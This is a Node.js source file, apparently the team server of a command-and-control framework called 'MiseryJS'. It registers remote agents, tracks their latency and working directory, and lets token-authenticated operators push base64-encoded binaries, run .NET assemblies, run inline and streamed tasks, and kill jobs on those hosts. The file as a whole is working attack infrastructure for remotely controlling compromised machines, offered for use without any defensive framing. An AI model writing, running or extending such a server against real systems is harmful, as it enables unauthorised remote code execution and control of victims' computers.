console.log(require('figlet').textSync('MiseryJS')) 
const express = require('express');
const app = express();
const teamApp = express();
const listener = require('http').Server(app, {
  maxHttpBufferSize: 1e8
});
const team = require('http').Server(teamApp, {
  maxHttpBufferSize: 1e8
});
const controllers = require('socket.io')(team);
const clients = require('socket.io')(listener);
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

teamApp.use(express.static(__dirname + '/public'));

teamApp.get('/module-scripts', (req, res) => {
  res.status(200).send(findFiles('agent/modules', 'return-types.js'));
});

teamApp.get('/*/return-types.js', (req, res) => {
  res.sendFile(__dirname + req.originalUrl.replace(/\?_=\d*/g, ''));
});

teamApp.get('/commands.json', (req, res) => {
  var commandFiles = findFiles('agent/modules', 'commands.json');
  var commands = JSON.parse(fs.readFileSync('commands.json'));
  commandFiles.forEach(f => {
    commands = {
      ...commands,
      ...JSON.parse(fs.readFileSync(f))
    };
  });

  res.status(200).send(commands);
});

var id = uuidv4();

var customers = [];

var queuedTasks = [];

controllers.on('connection', (socket) => {
  if(socket.handshake.auth.token != id){
    socket.disconnect(true);
    return;
  }

  controllers.emit('connections', customers);

  socket.on('echo', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("echo", msg.message);
      //console.log(cust.socketId + ": " + msg.message);
    }
  });

  socket.on('exit', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("exit");
    }
  });

  socket.on('list-jobs', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("list-jobs");
    }
  });

  socket.on('kill-job', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("kill-job", msg.args);
    }
  });

  socket.on('load', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      if(fs.existsSync(`./${msg.fileName}`)){
        
        binary = fs.readFileSync(`./${msg.fileName}`).toString('base64');
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + msg.fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on("execute-assembly", msg => {
    var cust = customers.find(c => c.id == msg.id);
    var fileName = msg.args[0];
    if(cust){
      if(fs.existsSync(`./${fileName}`)){
        
        binary = fs.readFileSync(`./${fileName}`).toString('base64');
        queuedTasks.push({
          check: "Loaded " + fileName,
          cust: cust.socketId,
          args: msg.args
        })
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-task', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-task", msg.args);
      console.log("Ran: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-inline', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-inline", msg.args);
      console.log("Run-inline: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-stream', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-stream", msg.args);
      console.log("Ran: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });
});

clients.on('connection', (socket) => {
  console.log("new connection: " + socket.id);

  let startTime;

  setInterval(() => {
    startTime = Date.now();
    socket.emit('ping');
  }, 1000);

  socket.on('pong', () => {
    latency = Date.now() - startTime;
    
    var cust = customers.find(c => c.socketId == socket.id);
    if(cust){
      cust.latency = latency + 'ms';
      controllers.emit('connections', customers);
    }
  });

  socket.on('register', msg => {
    msg.socketId = socket.id;
    msg.latency = 'Unknown';
    customers.push(msg);
    controllers.emit('connections', customers);
  });

  socket.on('disconnect', function() {
    console.log(socket.id + " disconnected");
    customers = customers.filter(c => c.socketId != socket.id);
    controllers.emit('connections', customers);
  });

  socket.on('echo', msg => {

    if(msg.returnType == 3){
      customers.find(c => c.socketId == socket.id).pwd = msg.output;
      controllers.emit('connections', customers);
    }

    controllers.emit('echo', msg);
    var task = queuedTasks.find(t => msg == t.check && socket.id == t.cust);

    if(task){
      socket.emit("run-task", task.args);
      //console.log("Ran: " + msg.args);
      queuedTasks = queuedTasks.filter(t => t != task);
    }
  });

});

var listenerPort = process.argv[3] ?? 8888;
var teamPort = process.argv[2] ?? 3000;
listener.listen(listenerPort, () => {
  console.log(`Listener server running at http://localhost:${listenerPort}/`);
});
team.listen(teamPort, () => {
  console.log(`Team server running at http://localhost:${teamPort}/`);
});

console.log("The super secret password is " + id);

function findFiles(startPath,filter){

  var results = [];

  var files = fs.readdirSync(startPath);
  for(var i = 0; i < files.length; i++){
      var filename = path.join(startPath, files[i]);
      var stat = fs.lstatSync(filename);
      if (stat.isDirectory()){
          results = results.concat(findFiles(filename, filter)); //recurse
      }else if (filename.indexOf(filter)>=0) {
          results.push(filename);
      }
  }
  return results;
}
